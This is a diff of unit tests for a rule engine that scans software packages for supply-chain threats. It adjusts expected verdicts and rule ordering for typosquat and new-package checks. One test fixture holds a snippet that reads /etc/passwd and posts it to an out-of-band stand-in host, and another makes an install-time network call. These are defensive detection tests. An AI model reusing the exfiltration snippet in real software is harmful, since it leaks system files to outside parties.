@@ -116,8 +116,8 @@ class ChangeTheFileNotTheCode(unittest.TestCase):
         edit(d, "scoring", lambda s: None)
         f, v = scan(rule_engine.load(d), files)
         self.assertTrue(f.has_decode_then_exec)
-        self.assertEqual(v.verdict, "BLOCK")
-        self.assertIn("within 12 lines", v.reasons[-1])                 # the reason text follows the rule's window
+        self.assertEqual(v.verdict, "NEEDS_HUMAN_REVIEW")
+        self.assertTrue(any("within 12 lines" in r for r in v.reasons), v.reasons)   # the reason text follows the rule's window
 
     def test_hard_rule_action_and_threshold_come_from_the_file(self):
         files = package({"setup.py": "import urllib.request\nurllib.request.urlopen('http://x')\n"})
@@ -168,16 +168,17 @@ class PostRulesComeFromTheFile(unittest.TestCase):
         d = copy_rules()                                          # typosquat raised to BLOCK
         edit(d, "post", lambda p: next(r for r in p["rules"] if r["id"] == "typosquat").update(verdict="BLOCK"))
         self.assertEqual(run_with_rules(d, POST_CASE.replace("AGE", "3"))[0], "BLOCK")
-        d = copy_rules()                                          # new_package checked before typosquat
-        edit(d, "post", lambda p: p["rules"].sort(key=lambda r: r["id"] != "new_package"))
-        self.assertEqual(run_with_rules(d, POST_CASE.replace("AGE", "3"))[1], {"rule": "new_package", "days": 3})
-        d = copy_rules()                                          # typosquat switched off, new package after 2 days
-        edit(d, "post", lambda p: (p.update(rules=[r for r in p["rules"] if r["id"] != "typosquat"]),
-                                   p["new_package"].update(days=2)))
+        d = copy_rules()                                          # typosquat switched off: age alone is no reason
+        edit(d, "post", lambda p: p.update(rules=[r for r in p["rules"] if r["id"] != "typosquat"]))
         self.assertEqual(run_with_rules(d, POST_CASE.replace("AGE", "3")), ["ALLOW", None])
         d = copy_rules()                                          # a 3-day-old project counts as established
         edit(d, "post", lambda p: p["typosquat"].update(established_days=3))
+        self.assertEqual(run_with_rules(d, POST_CASE.replace("AGE", "3")), ["ALLOW", None])
+        new_rule = {"id": "new_package", "title": "Newly registered project", "applies_to": ["ALLOW"], "verdict": "NEEDS_HUMAN_REVIEW"}
+        d = copy_rules()                                          # new_package can still be turned on, checked first
+        edit(d, "post", lambda p: (p["rules"].insert(0, new_rule), p["new_package"].update(days=5)))
         self.assertEqual(run_with_rules(d, POST_CASE.replace("AGE", "3"))[1], {"rule": "new_package", "days": 3})
+        self.assertEqual(run_with_rules(d, POST_CASE.replace("AGE", "6"))[1], {"rule": "typosquat", "of": "requests"})
 
     def test_version_diff_signal_list(self):
         code = """
@@ -201,7 +202,7 @@ class NewRuleReachesTheAgent(unittest.TestCase):
                          "info = open('/etc/passwd').read()\n"
                          "urllib.request.urlopen(urllib.request.Request('https://x.oastify.com/c', data=info.encode()))\n"})
         f, v = scan(rule_engine.load(), files)
-        self.assertEqual(v.verdict, "BLOCK")
+        self.assertEqual(v.verdict, "NEEDS_HUMAN_REVIEW")       # text rules only here; the behavior check makes it a BLOCK
         rec = review_report.package_record("mypkg", "1.0", v)
         self.assertEqual(rec["evidence"][0]["rule"], "exfil_endpoint")              # a lead rule comes first
         self.assertEqual(rec["risk"], review_report.RULES["exfil_endpoint"]["risk"])
